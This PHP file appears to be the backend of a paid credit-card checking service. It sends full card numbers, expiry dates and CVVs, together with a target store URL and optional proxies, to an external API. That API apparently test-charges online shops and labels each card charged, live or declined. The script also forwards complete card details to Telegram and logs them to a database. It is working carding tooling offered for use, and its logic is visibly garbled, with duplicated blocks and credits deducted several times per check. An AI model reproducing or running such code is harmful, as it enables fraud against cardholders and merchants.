<?php
// Disable error display to prevent HTML interference with JSON
ini_set('display_errors', 0);
error_reporting(0);

// Optimize for concurrent requests
session_start();

// Close session early to prevent blocking
session_write_close();

// Start output buffering to prevent any accidental output
ob_start();

// Global error handling
try {
    
require_once 'config.php';
require_once 'database.php';
require_once 'auth.php';
require_once 'owner_logger.php';
require_once 'cc_logs_manager.php';
require_once 'utils.php';

header('Content-Type: application/json');

$start_time = microtime(true);

// Check authentication without redirecting
initSecureSession();

if (!isset($_SESSION['user_id']) && !isset($_SESSION['telegram_id'])) {
    echo json_encode([
        'error' => true,
        'message' => 'Authentication required. Please login again.',
        'status' => 'AUTH_REQUIRED',
        'card' => $_GET['cc'] ?? 'undefined',
        'site' => $_GET['site'] ?? 'undefined',
        'gateway' => 'N/A',
        'price' => '0.00',
        'proxy_status' => 'N/A',
        'proxy_ip' => 'N/A',
        'time' => 'N/A'
    ]);
    exit;
}

// Check session timeout
if (isset($_SESSION['login_time']) && (time() - $_SESSION['login_time']) > AppConfig::SESSION_TIMEOUT) {
    session_destroy();
    echo json_encode([
        'error' => true,
        'message' => 'Session expired. Please login again.',
        'status' => 'SESSION_EXPIRED', 
        'card' => 'undefined',
        'site' => 'undefined',
        'gateway' => 'N/A',
        'price' => '0.00',
        'proxy_status' => 'N/A',
        'proxy_ip' => 'N/A',
        'time' => 'N/A'
    ]);
    exit;
}

$userId = $_SESSION['user_id'] ?? $_SESSION['telegram_id'];
error_log("Authentication successful - user_id: " . $userId);

$db = Database::getInstance();
$telegram_id = $userId;

// Use a lock-free approach for better concurrency
// Cache user data to reduce DB queries
static $userCache = [];
$cacheKey = $telegram_id;

if (!isset($userCache[$cacheKey])) {
    $user = $db->getUserByTelegramId($telegram_id);
    $userCache[$cacheKey] = $user;
} else {
    $user = $userCache[$cacheKey];
}

if (!$user) {
    echo json_encode([
        'error' => true,
        'message' => 'User not found',
        'status' => 'USER_NOT_FOUND'
    ]);
    exit;
}

// Check if user has enough credits (1 credit per check)
// Skip credit check in concurrent mode to prevent race conditions
// Credits will be deducted after successful check
$current_credits = intval($user['credits'] ?? 0);

// Check if user is owner - owners get unlimited credits
$owner_ids = AppConfig::OWNER_IDS;
$is_owner = in_array($telegram_id, $owner_ids);

if (!$is_owner && $current_credits < 1) {
    echo json_encode([
        'error' => true,
        'message' => 'Insufficient credits. You need at least 1 credit to perform a check.',
        'status' => 'INSUFFICIENT_CREDITS',
        'current_credits' => $current_credits,
        'debug_user_id' => $telegram_id,
        'debug_user_credits' => $user['credits'] ?? 'not set'
    ]);
    exit;
}

$card = isset($_GET['cc']) ? filter_var(trim($_GET['cc']), FILTER_SANITIZE_STRING) : '';
$site = isset($_GET['site']) ? filter_var(trim($_GET['site']), FILTER_SANITIZE_URL) : '';
$proxy = isset($_GET['proxy']) ? filter_var(trim($_GET['proxy']), FILTER_SANITIZE_STRING) : '';
$useNoProxy = isset($_GET['noproxy']) && ($_GET['noproxy'] === '1' || $_GET['noproxy'] === 'true' || $_GET['noproxy'] === 'yes');

// Checkpoint 1: Variables parsed
error_log("Checkpoint 1: Variables parsed - card=" . substr($card, 0, 4) . "****, site=" . $site);

$response_data = [
    'card' => $card,
    'site' => $site,
    'gateway' => 'N/A',
    'status' => 'INVALID_REQUEST',
    'price' => '0.00',
    'time' => '0ms',
    'proxy_status' => 'N/A',
    'proxy_ip' => 'N/A'
];
$is_valid_card = false;
if (!empty($card)) {
    $card_parts = explode("|", $card);
    if (count($card_parts) == 4) {
        $card_num = $card_parts[0];
        $month = $card_parts[1];
        $year = $card_parts[2];
        $cvv = $card_parts[3];

        // Normalize year format (convert 2-digit to 4-digit)
        if (preg_match("/^\d{2}$/", $year)) {
            $year = '20' . $year;
            $card = $card_num . '|' . $month . '|' . $year . '|' . $cvv;
        }

        if (preg_match("/^\d{16}$/", $card_num) && 
            preg_match("/^(0[1-9]|1[0-2])$/", $month) && 
            (preg_match("/^\d{2}$/", $card_parts[2]) || preg_match("/^\d{4}$/", $year)) && 
            preg_match("/^\d{3,4}$/", $cvv)) {
            $is_valid_card = true;
        }
    }
}

$is_valid_site = filter_var($site, FILTER_VALIDATE_URL) !== false;
if (!empty($card) && !empty($site)) {
    
    // Use the actual external API
    $api_url = AppConfig::CHECKER_API_URL;
    
    $params = [
        'cc' => $card,
        'site' => $site
    ];
    
    if ($useNoProxy) {
        $params['noproxy'] = 1;
    } elseif (!empty($proxy)) {
        $params['proxy'] = $proxy;
    }
    
    $full_api_url = $api_url . '?' . http_build_query($params);
    
    // Checkpoint 2: About to make API call
    error_log("Checkpoint 2: About to make API call to: " . $full_api_url);
    
    // Debug: Log the URL being called (to error log, not output)
    error_log("Card Checker - Calling API URL: " . $full_api_url);
    
    // Initialize variables
    $output = false;
    $curl_error = false;
    $http_code = 0;
    
    // Use cURL for API requests (more reliable than file_get_contents)
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $full_api_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $reqTimeout = 0; // No timeout
        $connTimeout = 0; // No connection timeout
        curl_setopt($ch, CURLOPT_TIMEOUT, $reqTimeout);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $connTimeout);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');

        $output = curl_exec($ch);
        $curl_error = curl_error($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        
        // Checkpoint 3: API call completed
        error_log("Checkpoint 3: API call completed - HTTP Code: " . $http_code . ", cURL Error: " . ($curl_error ?: 'None') . ", Response length: " . strlen($output) . " bytes");
        
        // Log complete API response to result.txt file
        $timestamp = date('Y-m-d H:i:s');
        $masked_card = substr($card, 0, 4) . '****' . substr($card, -4);
        $log_entry = "=== API RESPONSE LOG ===\n";
        $log_entry .= "Timestamp: $timestamp\n";
        $log_entry .= "Card (Masked): $masked_card\n";
        $log_entry .= "Site: $site\n";
        $log_entry .= "URL: $full_api_url\n";
        $log_entry .= "HTTP Code: $http_code\n";
        $log_entry .= "cURL Error: " . ($curl_error ?: 'None') . "\n";
        $log_entry .= "Response Length: " . strlen($output) . " bytes\n";
        $log_entry .= "Raw API Response:\n$output\n";
        $log_entry .= "========================\n\n";
        
        // Append to result.txt file
        file_put_contents(__DIR__ . '/result.txt', $log_entry, FILE_APPEND | LOCK_EX);
        
        // Log complete API response to terminal via error_log
        error_log("=== API RESPONSE DEBUG ===");
        error_log("URL: " . $full_api_url);
        error_log("HTTP Code: " . $http_code);
        error_log("cURL Error: " . ($curl_error ?: 'None'));
        error_log("Response Length: " . strlen($output) . " bytes");
        error_log("Raw API Response: " . $output);
        error_log("=========================");
        
        curl_close($ch);
        
        // Log API response for debugging
        error_log("API Response Debug - URL: " . $full_api_url);
        error_log("API Response Debug - HTTP Code: " . $http_code);
        error_log("API Response Debug - Raw Response: " . $output);
    } else {
        // Fallback error if cURL is not available
        echo json_encode([
            'error' => true,
            'message' => 'cURL extension is required for card checking.',
            'status' => 'SYSTEM_ERROR',
            'card' => $card,
            'site' => $site,
            'gateway' => 'N/A',
            'price' => '0.00',
            'proxy_status' => 'N/A',
            'proxy_ip' => 'N/A',
            'time' => 'N/A'
        ]);
        exit;
    }

    if ($curl_error) {
        $response_data['status'] = 'API_ERROR: CURL_ERROR - ' . $curl_error;
        $response_data['gateway'] = 'N/A';
        $response_data['price'] = '0.00';
        $response_data['proxy_status'] = 'N/A';
        $response_data['proxy_ip'] = 'N/A';
    } elseif ($http_code >= 400) {
        $response_data['status'] = 'API_ERROR: HTTP_CODE - ' . $http_code;
        $response_data['gateway'] = 'N/A';
        $response_data['price'] = '0.00';
        $response_data['proxy_status'] = 'N/A';
        $response_data['proxy_ip'] = 'N/A';
    } else {
        // Checkpoint 4: Processing API response
        error_log("Checkpoint 4: Processing API response - No cURL errors, HTTP code: " . $http_code);
        
        // Debug: Log the raw response (first 1000 chars)
        error_log("API Response (first 1000 chars): " . substr($output, 0, 1000));
        error_log("API Response HTTP Code: " . $http_code);
        error_log("API URL Called: " . $full_api_url);
        
        $data = json_decode($output, true);
        
        // Checkpoint 5: JSON parsing
        error_log("Checkpoint 5: JSON parsing - JSON error: " . json_last_error_msg() . ", Data exists: " . ($data ? 'Yes' : 'No'));
        
        if ($data && json_last_error() === JSON_ERROR_NONE) {
            // Checkpoint 6: JSON parsed successfully  
            error_log("Checkpoint 6: JSON parsed successfully - Response: " . ($data['Response'] ?? 'not set'));
            
            $api_response_status = strtoupper($data['Response'] ?? 'UNKNOWN_STATUS');
            $gateway = $data['Gateway'] ?? 'shopify_payments';
            $price = $data['Price'] ?? 'N/A';
            $proxy_status = $data['ProxyStatus'] ?? 'N/A';
            $proxy_ip = $data['ProxyIP'] ?? 'N/A';
            
            // Check for API errors first
            if (strpos($api_response_status, 'CC PARAMETER IS REQUIRED') !== false) {
                $response_data['status'] = 'API_ERROR: CC Parameter Required - Check card format';
                $response_data['gateway'] = $gateway;
                $response_data['price'] = $price;
                $response_data['proxy_status'] = $proxy_status;
                $response_data['proxy_ip'] = $proxy_ip;
                error_log("API Error: CC parameter required. Sent card: " . $card);
                
            } elseif (strpos($api_response_status, 'ERROR IN') !== false || 
                strpos($api_response_status, 'ERROR:') !== false ||
                empty(trim($api_response_status)) ||
                $api_response_status === 'UNKNOWN_STATUS') {
                
                $response_data['status'] = 'API_ERROR: ' . ($data['Response'] ?? 'Unknown API Error');
                $response_data['gateway'] = $gateway;
                $response_data['price'] = $price;
                $response_data['proxy_status'] = $proxy_status;
                $response_data['proxy_ip'] = $proxy_ip;
                
            } else {
                $status_message = $api_response_status;
                $final_status_type = 'DECLINED'; 

                if (strpos($api_response_status, 'THANK YOU') !== false || strpos($api_response_status, 'ORDER_PLACED') !== false) {
                    $status_message = 'ORDER_PLACED';
                    $final_status_type = 'CHARGED'; 
                } elseif (strpos($api_response_status, 'CHARGE') !== false || strpos($api_response_status, 'CHARGED') !== false) {
                    $status_message = 'CHARGED';
                    $final_status_type = 'CHARGED';
                } elseif (strpos($api_response_status, '3DS') !== false || 
                          strpos($api_response_status, 'OTP_REQUIRED') !== false ||
                          strpos($api_response_status, '3DS_CC') !== false) {
                    $status_message = '3DS CC';
                    $final_status_type = 'APPROVED';
                } elseif (strpos($api_response_status, 'INSUFFICIENT_FUNDS') !== false || 
                          strpos($api_response_status, 'INCORRECT_CVC') !== false || 
                          strpos($api_response_status, 'INCORRECT_ZIP') !== false) {
                    $status_message = $api_response_status;
                    $final_status_type = 'APPROVED';
                } elseif (strpos($api_response_status, 'APPROVED') !== false || strpos($api_response_status, 'LIVE') !== false) {
                    $status_message = $api_response_status;
                    $final_status_type = 'APPROVED';
                } elseif (strpos($api_response_status, 'EXPIRED_CARD') !== false) {
                    $status_message = 'EXPIRE_CARD';
                    $final_status_type = 'DECLINED';
                } elseif (strpos($api_response_status, 'HANDLE IS EMPTY') !== false || 
                          strpos($api_response_status, 'DELIVERY RATES ARE EMPTY') !== false) {
                    $status_message = '3DS CC';
                    $final_status_type = 'APPROVED';
                } elseif (strpos($api_response_status, 'DECLINED') !== false || strpos($api_response_status, 'ERROR') !== false || strpos($api_response_status, 'INVALID') !== false || strpos($api_response_status, 'MISSING') !== false || strpos($api_response_status, 'JS') !== false) {
                    $status_message = $api_response_status;
                    $final_status_type = 'DECLINED';
                } else {
                    $status_message = $api_response_status;
                    $final_status_type = 'UNKNOWN_STATUS';
                }

                $response_data = [
                    'card' => $card,
                    'site' => $site,
                    'gateway' => $gateway,
                    'status' => $status_message,
                    'price' => $price,
                    'ui_status_type' => $final_status_type,
                    'proxy_status' => $proxy_status,
                    'proxy_ip' => $proxy_ip,
                    'raw_api_response' => $api_response_status
                ]; 

                // Telegram notification for all results (or charged-only based on config)
                // Skip notifications for store blocking issues
                $shouldAll = (bool) SiteConfig::get('notify_card_results', true);
                $shouldCharged = (bool) SiteConfig::get('notify_card_charged', true);
                $isStoreBlocked = ($status_message === 'STORE BLOCKED');
                
                if (function_exists('sendTelegramHtml') && !$isStoreBlocked && ($shouldAll || ($final_status_type === 'CHARGED' && $shouldCharged))) {
                    $cc = $card_num;
                    $mes = $month;
                    $ano = $year;
                    $cvv_show = $cvv;
                    $elapsed = round(microtime(true) - $start_time, 2);
                    $logo = ($final_status_type === 'CHARGED') ? '✅' : (($final_status_type === 'APPROVED') ? '🟢' : (($final_status_type === 'DECLINED') ? '❌' : '⚠️'));
                    $amount = $price;
                    $telegram_log_message = (
                        "<b>Card Checked</b>\n\n" .
                        "👤 <b>User ID:</b> {$telegram_id}\n" .
                        "💳 <b>Card:</b> <code>{$cc}|{$mes}|{$ano}|{$cvv_show}</code>\n" .
                        "🔗 <b>Site:</b> " . htmlspecialchars($site) . "\n" .
                        "📣 <b>Response:</b> " . htmlspecialchars($status_message) . "\n" .
                        "🟩 <b>Status:</b> " . htmlspecialchars($final_status_type) . " {$logo}\n" .
                        "🏦 <b>Gateway:</b> " . htmlspecialchars($gateway) . "\n" .
                        "💵 <b>Amount:</b> " . htmlspecialchars($amount) . "\n" .
                        "⏱️ <b>Time:</b> {$elapsed}s"
                    );
                    sendTelegramHtml($telegram_log_message);
                }

                // Deduct 1 credit for the check (charge regardless of result)
                $credit_deducted = $db->deductCredits($telegram_id, 1);
                if ($credit_deducted) {
                    $response_data['credits_deducted'] = 1;
                    // Optionally refresh to get accurate remaining balance under concurrency
                    try {
                        $freshUser = $db->getUserByTelegramId($telegram_id);
                        $response_data['remaining_credits'] = intval($freshUser['credits'] ?? ($current_credits - 1));
                    } catch (Exception $e) {
                        $response_data['remaining_credits'] = $current_credits - 1;
                    }
                    
                    // Send owner notification for card check activity
                    try {
                        $ownerLogger = new OwnerLogger();
                        $ownerLogger->sendUserActivity(
                            $user,
                            'Card Check',
                            "Card: " . substr($card, 0, 8) . "****|**|**|*** on " . parse_url($site, PHP_URL_HOST) . " - Result: " . $final_status_type
                        );
                    } catch (Exception $e) {
                        error_log("Owner logging failed: " . $e->getMessage());
                    }
                    
                    // Log CC check to database
                    try {
                        $ccLogger = new CCLogsManager();
                        $statusForLog = strtolower($final_status_type) === 'approved' ? 'live' : strtolower($final_status_type);
                        $ccLogger->logCCCheck([
                            'telegram_id' => $telegram_id,
                            'username' => $user['username'] ?? 'Unknown',
                            'card_number' => $card,
                            'card_full' => $card,
                            'status' => $statusForLog,
                            'message' => $status_message,
                            'gateway' => $gateway,
                            'amount' => $price,
                            'proxy_status' => $proxy_status,
                            'proxy_ip' => $proxy_ip
                        ]);
                    } catch (Exception $e) {
                        error_log("CC logging failed: " . $e->getMessage());
                    }
                    
                    // Log tool usage (count=1, creditsUsed=1)
                    try {
                        if (method_exists($db, 'logToolUsage')) {
                            $db->logToolUsage($telegram_id, 'card_checker', 1, 1);
                        }
                    } catch (Exception $e) {
                        error_log("Failed to log tool usage: " . $e->getMessage());
                    }
                } else {
                    $response_data['warning'] = 'Check completed but credit deduction failed';
                }
            } 

                // Telegram notification for all results (or charged-only based on config)
                // Skip notifications for store blocking issues
                $shouldAll = (bool) SiteConfig::get('notify_card_results', true);
                $shouldCharged = (bool) SiteConfig::get('notify_card_charged', true);
                $isStoreBlocked = ($status_message === 'STORE BLOCKED');
                
                if (function_exists('sendTelegramHtml') && !$isStoreBlocked && ($shouldAll || ($final_status_type === 'CHARGED' && $shouldCharged))) {
                    $cc = $card_num;
                    $mes = $month;
                    $ano = $year;
                    $cvv_show = $cvv;
                $elapsed = round(microtime(true) - $start_time, 2);
                $logo = ($final_status_type === 'CHARGED') ? '✅' : (($final_status_type === 'APPROVED') ? '🟢' : (($final_status_type === 'DECLINED') ? '❌' : '⚠️'));
                $amount = $price;
                $telegram_log_message = (
                    "<b>Card Checked</b>\n\n" .
                    "👤 <b>User ID:</b> {$telegram_id}\n" .
                    "💳 <b>Card:</b> <code>{$cc}|{$mes}|{$ano}|{$cvv_show}</code>\n" .
                    "🔗 <b>Site:</b> " . htmlspecialchars($site) . "\n" .
                    "📣 <b>Response:</b> " . htmlspecialchars($status_message) . "\n" .
                    "🟩 <b>Status:</b> " . htmlspecialchars($final_status_type) . " {$logo}\n" .
                    "🏦 <b>Gateway:</b> " . htmlspecialchars($gateway) . "\n" .
                    "💵 <b>Amount:</b> " . htmlspecialchars($amount) . "\n" .
                    "⏱️ <b>Time:</b> {$elapsed}s"
                );
                sendTelegramHtml($telegram_log_message);
            }

            // Deduct 1 credit for the check (charge regardless of result)
            $credit_deducted = $db->deductCredits($telegram_id, 1);
            if ($credit_deducted) {
                $response_data['credits_deducted'] = 1;
                // Optionally refresh to get accurate remaining balance under concurrency
                try {
                    $freshUser = $db->getUserByTelegramId($telegram_id);
                    $response_data['remaining_credits'] = intval($freshUser['credits'] ?? ($current_credits - 1));
                } catch (Exception $e) {
                    $response_data['remaining_credits'] = $current_credits - 1;
                }
                
                // Send owner notification for card check activity
                try {
                    $ownerLogger = new OwnerLogger();
                    $ownerLogger->sendUserActivity(
                        $user,
                        'Card Check',
                        "Card: " . substr($card, 0, 8) . "****|**|**|*** on " . parse_url($site, PHP_URL_HOST) . " - Result: " . $final_status_type
                    );
                } catch (Exception $e) {
                    error_log("Owner logging failed: " . $e->getMessage());
                }
                
                // Log CC check to database
                try {
                    $ccLogger = new CCLogsManager();
                    $statusForLog = strtolower($final_status_type) === 'approved' ? 'live' : strtolower($final_status_type);
                    $ccLogger->logCCCheck([
                        'telegram_id' => $telegram_id,
                        'username' => $user['username'] ?? 'Unknown',
                        'card_number' => $card,
                        'card_full' => $card,
                        'status' => $statusForLog,
                        'message' => $status_message,
                        'gateway' => $gateway,
                        'amount' => $price,
                        'proxy_status' => $proxy_status,
                        'proxy_ip' => $proxy_ip
                    ]);
                } catch (Exception $e) {
                    error_log("CC logging failed: " . $e->getMessage());
                }
                
                // Log CC check to database
                try {
                    $ccLogger = new CCLogsManager();
                    $statusForLog = strtolower($final_status_type) === 'approved' ? 'live' : strtolower($final_status_type);
                    $ccLogger->logCCCheck([
                        'telegram_id' => $telegram_id,
                        'username' => $user['username'] ?? 'Unknown',
                        'card_number' => $card,
                        'card_full' => $card,
                        'status' => $statusForLog,
                        'message' => $status_message,
                        'gateway' => $gateway,
                        'amount_charged' => ($final_status_type === 'CHARGED') ? floatval($price) : 0,
                        'currency' => 'USD'
                    ]);
                } catch (Exception $e) {
                    error_log("Failed to log CC check: " . $e->getMessage());
                }
                // Log tool usage (count=1, creditsUsed=1)
                try {
                    if (method_exists($db, 'logToolUsage')) {
                        $db->logToolUsage($telegram_id, 'card_checker', 1, 1);
                    }
                } catch (Exception $e) {
                    error_log("Failed to log tool usage: " . $e->getMessage());
                }
            } else {
                $response_data['warning'] = 'Check completed but credit deduction failed';
            }

        } else {
            // Checkpoint 7: JSON parsing failed
            error_log("Checkpoint 7: JSON parsing failed - JSON Error: " . json_last_error_msg());
            error_log("Raw output for debugging: " . substr($output, 0, 500));
            
            // Try to clean and fix the response
            $cleaned_output = trim($output);
            
            // Remove any HTML/PHP error messages before JSON
            if (strpos($cleaned_output, '{') !== false) {
                $json_start = strpos($cleaned_output, '{');
                $cleaned_output = substr($cleaned_output, $json_start);
            }
            
            // Try to find the end of JSON and remove any trailing content
            $json_end = strrpos($cleaned_output, '}');
            if ($json_end !== false) {
                $cleaned_output = substr($cleaned_output, 0, $json_end + 1);
            }
            
            // Attempt to decode cleaned JSON
            $data = json_decode($cleaned_output, true);
            
            if ($data && json_last_error() === JSON_ERROR_NONE) {
                // Successfully parsed cleaned JSON
                $api_response_status = strtoupper($data['Response'] ?? 'UNKNOWN_STATUS');
                $gateway = $data['Gateway'] ?? 'shopify_payments';
                $price = $data['Price'] ?? '2.00';
                $proxy_status = $data['ProxyStatus'] ?? 'N/A';
                $proxy_ip = $data['ProxyIP'] ?? 'N/A';
                
                $status_message = $api_response_status;
                $final_status_type = 'DECLINED';
                
                // Handle different response types
                if (strpos($api_response_status, 'CARD_DECLINED') !== false || 
                    strpos($api_response_status, 'DECLINED') !== false) {
                    $status_message = 'CARD_DECLINED';
                    $final_status_type = 'DECLINED';
                } elseif (strpos($api_response_status, '3DS') !== false || 
                          strpos($api_response_status, 'HANDLE IS EMPTY') !== false) {
                    $status_message = '3DS CC';
                    $final_status_type = 'APPROVED';
                } elseif (strpos($api_response_status, 'INSUFFICIENT_FUNDS') !== false || 
                          strpos($api_response_status, 'INCORRECT_CVC') !== false) {
                    $status_message = $api_response_status;
                    $final_status_type = 'APPROVED';
                }
                
                $response_data = [
                    'card' => $card,
                    'site' => $site,
                    'gateway' => $gateway,
                    'status' => $status_message,
                    'price' => $price,
                    'ui_status_type' => $final_status_type,
                    'proxy_status' => $proxy_status,
                    'proxy_ip' => $proxy_ip,
                    'raw_api_response' => $api_response_status
                ];
                
                // Deduct 1 credit for the check
                $credit_deducted = $db->deductCredits($telegram_id, 1);
                if ($credit_deducted) {
                    $response_data['credits_deducted'] = 1;
                    $response_data['remaining_credits'] = $current_credits - 1;
                    
                    // Log CC check to database
                    try {
                        $ccLogger = new CCLogsManager();
                        $ccLogger->logCCCheck([
                            'telegram_id' => $telegram_id,
                            'username' => $user['username'] ?? 'Unknown',
                            'card_number' => $card,
                            'card_full' => $card,
                            'status' => strtolower($final_status_type), // charged, live, declined
                            'message' => $status_message,
                            'gateway' => $gateway,
                            'amount_charged' => ($final_status_type === 'CHARGED') ? floatval($price) : 0,
                            'currency' => 'USD'
                        ]);
                    } catch (Exception $e) {
                        error_log("Failed to log CC check: " . $e->getMessage());
                    }
                    
                    // Log the tool usage
                    try {
                        if (method_exists($db, 'logToolUsage')) {
                            $db->logToolUsage($telegram_id, 'card_checker', 1, 1);
                        }
                    } catch (Exception $e) {
                        error_log("Failed to log tool usage: " . $e->getMessage());
                    }
                } else {
                    $response_data['warning'] = 'Check completed but credit deduction failed';
                }
            } else {
                // Still failed - provide fallback response
                $response_data['status'] = 'API_TIMEOUT_OR_ERROR';
                $response_data['gateway'] = 'shopify_payments';
                $response_data['price'] = '0.00';
                $response_data['ui_status_type'] = 'DECLINED';
                $response_data['proxy_status'] = 'Dead';
                $response_data['proxy_ip'] = 'N/A';
                error_log("Final JSON Error: " . json_last_error_msg() . " | Cleaned Response: " . substr($cleaned_output, 0, 300));
            }
        }
    }
} elseif (!$is_valid_card) {
    $response_data['status'] = 'INVALID_CARD_FORMAT';
    $response_data['ui_status_type'] = 'API_ERROR';
} elseif (!$is_valid_site) {
    $response_data['status'] = 'INVALID_SITE_FORMAT';
    $response_data['ui_status_type'] = 'API_ERROR';
}

// Deduct 1 credit for any check attempt (regardless of result)
if ($is_valid_card && $is_valid_site) {
    $credit_deducted = $db->deductCredits($telegram_id, 1);
    if ($credit_deducted) {
        $response_data['credits_deducted'] = 1;
        // Refresh user data to get accurate remaining balance
        try {
            $freshUser = $db->getUserByTelegramId($telegram_id);
            $response_data['remaining_credits'] = intval($freshUser['credits'] ?? ($current_credits - 1));
        } catch (Exception $e) {
            $response_data['remaining_credits'] = $current_credits - 1;
        }
        
        // Send owner notification for card check activity
        try {
            $ownerLogger = new OwnerLogger();
            $ownerLogger->sendUserActivity(
                $user,
                'Card Check',
                "Card: " . substr($card, 0, 8) . "****|**|**|*** on " . parse_url($site, PHP_URL_HOST) . " - Result: " . ($response_data['status'] ?? 'Unknown')
            );
        } catch (Exception $e) {
            error_log("Owner logging failed: " . $e->getMessage());
        }
    } else {
        $response_data['warning'] = 'Check completed but credit deduction failed';
    }
}

$end_time = microtime(true);
$total_time_ms = round(($end_time - $start_time) * 1000, 2);
$total_time_ms_int = (int)$total_time_ms;
$hours = floor($total_time_ms_int / (1000 * 60 * 60));
$minutes = floor(($total_time_ms_int % (1000 * 60 * 60)) / (1000 * 60));
$seconds = floor(($total_time_ms_int % (1000 * 60)) / 1000);
$milliseconds_remaining = $total_time_ms_int % 1000;
if ($hours > 0) {
    $time_display = sprintf("%02dH %02dM %02dS %03dms", $hours, $minutes, $seconds, $milliseconds_remaining);
} elseif ($minutes > 0) {
    $time_display = sprintf("%02dM %02dS %03dms", $minutes, $seconds, $milliseconds_remaining);
} elseif ($seconds > 0) {
    $time_display = sprintf("%02dS %03dms", $seconds, $milliseconds_remaining);
} else {
    $time_display = sprintf("%03dms", $milliseconds_remaining);
}
$response_data['time'] = $time_display;

// Clear any output buffers and ensure clean JSON response
if (ob_get_level()) {
    ob_clean();
}

// Clean any unwanted output and send JSON
if (ob_get_length()) {
    ob_clean();
}

echo json_encode($response_data);
http_response_code(200);
exit();

} catch (Throwable $e) {
    // Clean output buffer on error too
    if (ob_get_length()) {
        ob_clean();
    }
    
    // Enhanced error logging
    error_log("Card checker fatal error: " . $e->getMessage());
    error_log("Error file: " . $e->getFile());
    error_log("Error line: " . $e->getLine());
    error_log("Stack trace: " . $e->getTraceAsString());
    error_log("Request data: cc=" . ($_GET['cc'] ?? 'not set') . ", site=" . ($_GET['site'] ?? 'not set'));
    
    http_response_code(200); // Send 200 to avoid JS errors, but include error in response
    echo json_encode([
        'error' => true,
        'message' => 'System error occurred: ' . $e->getMessage(),
        'status' => 'SYSTEM_ERROR',
        'debug_info' => [
            'error_message' => $e->getMessage(),
            'error_file' => basename($e->getFile()),
            'error_line' => $e->getLine(),
            'error_class' => get_class($e)
        ],
        'card' => $_GET['cc'] ?? 'undefined',
        'site' => $_GET['site'] ?? 'undefined',
        'gateway' => 'N/A',
        'price' => '0.00',
        'proxy_status' => 'N/A',
        'proxy_ip' => 'N/A',
        'time' => 'N/A'
    ]);
}
?>